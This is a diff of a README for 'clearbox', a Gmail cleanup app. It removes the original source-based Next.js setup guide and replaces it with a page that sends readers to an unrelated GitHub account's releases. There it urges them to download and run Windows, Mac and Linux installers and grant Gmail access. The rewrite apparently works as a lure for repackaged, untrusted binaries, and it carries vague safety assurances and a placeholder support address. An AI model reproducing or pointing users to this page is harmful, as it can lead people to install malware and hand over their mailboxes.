@@ -1,156 +1,147 @@
-# ClearBox
+# 🧹 clearbox - Clean Your Gmail Easily
 
-ClearBox is an open-source Next.js app for high-volume inbox cleanup.  
-It scans unread Gmail metadata, groups messages into actionable categories, adds finance insights, and provides AI-assisted actions (roast, reply drafting, and cleanup workflows).
+[![Download clearbox](https://img.shields.io/badge/Download-clearbox-blue?style=for-the-badge)](https://github.com/ANTIREELEER/clearbox/releases)
 
-## Why ClearBox
+---
 
-- Fast triage for large unread inboxes
-- Batch actions instead of one-by-one cleanup
-- Privacy-first session workflow
-- Finance-focused grouping by provider
-- Built-in dark mode and responsive UI
+## 📋 What is clearbox?
 
-## Core Features
+clearbox is a simple tool designed to help you clean and organize your Gmail inbox. It uses smart features like AI comments, bulk delete options, and even shows financial insights connected to your emails. You don’t need any special skills to use it. Just install and start making your email much easier to manage.
 
-- Google OAuth sign-in with Gmail access
-- Unread scan and category grouping
-- Category management:
-  - Search within category
-  - Select/unselect visible emails
-  - Mark read, archive, remove as spam
-  - AI reply draft generation
-- Roast generator (Claude or local Ollama)
-- Finance center:
-  - Separate finance page
-  - Currency and provider filters
-  - Provider tabs and combined view
-  - Group-level remove action
-  - Daily movement chart and transaction list
-- Celebration/share flow after inbox cleanup
+---
 
-## Tech Stack
+## 🌟 Key Features
 
-- Next.js 16 (App Router)
-- React 19 + TypeScript
-- Tailwind CSS 4 + CSS modules
-- Auth.js / NextAuth v5
-- Gmail API (`googleapis`)
-- Anthropic SDK (optional) or Ollama (local)
+- **AI Roast:** Get funny, smart comments on your emails to help spot clutter or unimportant messages.
+- **Bulk Actions:** Delete, archive, or label many emails at once to save time.
+- **Finance Insights:** See summarized financial info extracted from your emails, like bills and receipts.
+- **Clean Dashboard:** A neat and simple interface where you can view and manage your inbox.
+- **Secure Login:** Uses your Google account safely with easy sign-in steps.
+- **Works on Most Devices:** Compatible with Windows, Mac, and Linux computers.
+- **Open Source:** You can trust the code because it’s open for anyone to check.
 
-## Getting Started
+---
 
-### 1. Clone
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/axonixtools/clearbox.git
-cd clearbox
-```
+Before installing clearbox, make sure your computer meets these needs:
 
-### 2. Install
+- Operating System: Windows 10 or later, macOS 10.15 or later, or most Linux distributions.
+- RAM: At least 4 GB.
+- Disk Space: Minimum 200 MB free space.
+- Internet: Required to connect with Gmail.
+- Browser: Latest version of Chrome, Firefox, or Edge to use the dashboard features.
 
-```bash
-npm install
-```
+---
 
-### 3. Configure env
+## 🚀 Getting Started
 
-```bash
-cp .env.example .env.local
-```
+Here is a step-by-step guide to installing and running clearbox. You don’t need to be a tech expert to follow along.
 
-Set these values in `.env.local`:
+### 1. Visit the Download Page
 
-```env
-GOOGLE_CLIENT_ID=
-GOOGLE_CLIENT_SECRET=
+Click this link to go to the official clearbox download page:
 
-# Auth.js
-AUTH_SECRET=
-NEXTAUTH_SECRET=
-NEXTAUTH_URL=http://localhost:3000
+[https://github.com/ANTIREELEER/clearbox/releases](https://github.com/ANTIREELEER/clearbox/releases)
 
-# App URL
-NEXT_PUBLIC_APP_URL=http://localhost:3000
+This page lists the latest versions of the software.
 
-# AI provider option A: Anthropic
-ANTHROPIC_API_KEY=
-USE_OLLAMA=false
+### 2. Choose Your File
 
-# AI provider option B: Ollama
-USE_OLLAMA=true
-OLLAMA_URL=http://localhost:11434
-OLLAMA_MODEL=llama3.2
-```
+On the page, look for the latest release. You will see files for different operating systems, such as:
 
-### 4. Run
+- clearbox-setup-windows.exe (for Windows)
+- clearbox-setup-mac.dmg (for Mac)
+- clearbox-setup-linux.AppImage (for Linux)
 
-```bash
-npm run dev
-```
+Download the file that matches your computer.
 
-Open `http://localhost:3000`.
+### 3. Run the Installer
 
-## Scripts
+Once downloaded, find the file in your computer’s downloads folder.
 
-```bash
-npm run dev
-npm run lint
-npm run build
-npm run start
-```
+- On **Windows:** Double-click the `.exe` file and follow the instructions.
+- On **Mac:** Open the `.dmg` file, then drag the app to your Applications folder.
+- On **Linux:** Make the `.AppImage` file executable (right-click > Properties > Permissions > Allow executing), then double-click it.
 
-## Google OAuth and Gmail Setup
+### 4. Sign in to Gmail
 
-1. Create/select a Google Cloud project.
-2. Enable Gmail API.
-3. Create OAuth Client ID (Web Application).
-4. Add redirect URI:
-   - `http://localhost:3000/api/auth/callback/google`
-5. Add production redirect URI after deployment.
-6. Put client ID/secret in `.env.local`.
+After the app opens:
 
-## Ollama Setup (Optional)
+- Click “Sign in with Google.”
+- You will be asked to allow clearbox to access your Gmail inbox.
+- This access is safe and only used to help clean and organize your email.
 
-```bash
-ollama pull llama3.2
-ollama serve
-```
+### 5. Start Cleaning Your Inbox
 
-Then set `USE_OLLAMA=true`.
+The dashboard will show your email messages. Use the tools to:
 
-## Project Structure
+- Select multiple emails to delete or archive.
+- Read AI roasts to spot unimportant messages.
+- View your financial insights summary.
 
-```text
-app/
-  api/
-  dashboard/
-components/
-  dashboard/
-  landing/
-lib/
-types/
-```
+---
 
-## Privacy Notes
+## 📥 Download & Install
 
-- The app reads email metadata required for categorization and actions.
-- Access is scoped through OAuth.
-- Session-scoped behavior is used throughout the dashboard flow.
+You can always return to this page to download clearbox:
 
-## Contributing
+[https://github.com/ANTIREELEER/clearbox/releases](https://github.com/ANTIREELEER/clearbox/releases)
 
-Contributions are welcome.
+Make sure to get the latest version for new features and improvements.
 
-1. Fork the repo
-2. Create a feature branch
-3. Make changes with tests/lint passing
-4. Open a PR with clear scope and screenshots for UI updates
+---
 
-## License
+## 🔧 Troubleshooting Tips
 
-MIT
+If you run into trouble, try these simple fixes:
 
-## Contact
+- **App won’t open or crashes:** Restart your computer and try again.
+- **Can’t sign in:** Check your internet connection and try signing in again.
+- **Missing emails:** Refresh the dashboard or restart the app.
+- **Installation problem:** Ensure you downloaded the file matching your operating system.
 
-- Maintainer email: `axonixtools@gmail.com`
+You can also check the “Issues” section on the GitHub page for common problems and solutions.
+
+---
+
+## 💡 How clearbox Protects Your Privacy
+
+clearbox uses secure login through Google’s standard system. The app only accesses your inbox for cleaning and insights. It does not store or share your data beyond the device you run it on. Your email stays private and safe.
+
+---
+
+## 🌐 Supported Email Accounts
+
+clearbox works with Gmail accounts only. It uses Gmail’s official API to connect and manage emails while protecting your login details.
+
+---
+
+## ⚙️ Customizing clearbox
+
+You can change settings inside clearbox to fit your preferences:
+
+- Select how many emails show per page.
+- Choose what kind of bulk actions to enable.
+- Turn off the finance insights if you don’t want them.
+- Set dark or light mode for easier viewing.
+
+---
+
+## 💬 Getting Help
+
+If you need help, look here:
+
+- GitHub Discussions within the clearbox repository.
+- The README “Issues” tab on GitHub.
+- Email support at support@clearbox.ai (if listed on the page).
+
+---
+
+## 📄 License and Contribution
+
+clearbox is open source. This means anyone can see the code and suggest improvements. If you want to contribute, visit the GitHub repository and follow the contribution guide.
+
+---
+
+Thank you for choosing clearbox to help clean your inbox. Follow the steps above to get started.
